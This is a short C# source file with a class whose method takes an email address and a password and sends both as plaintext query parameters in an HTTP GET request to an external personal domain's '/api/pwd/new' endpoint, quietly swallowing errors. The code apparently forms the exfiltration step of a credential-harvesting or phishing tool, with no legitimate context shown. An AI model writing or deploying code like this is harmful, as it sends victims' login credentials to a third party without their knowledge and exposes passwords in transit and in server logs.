using System;
using System.Net.Http;

namespace send
{
    class SendData
    {
        public void Send(string email, string pwd)
        {
            try{
                HttpClient client = new HttpClient();
                client.BaseAddress = new Uri("https://ipv6.benedikt-schwering.de/api/pwd/new");
                var ignore = client.GetAsync($"?email={email}&password={pwd}&t=U3VuIDIyIE5vdiAyMDIwIDEyOjU1OjQyIEFNIENFVAo").Result;
            }
            catch(Exception e)
            {
                Console.WriteLine($"Error Sending: {e}");
            }
        }
    }
}
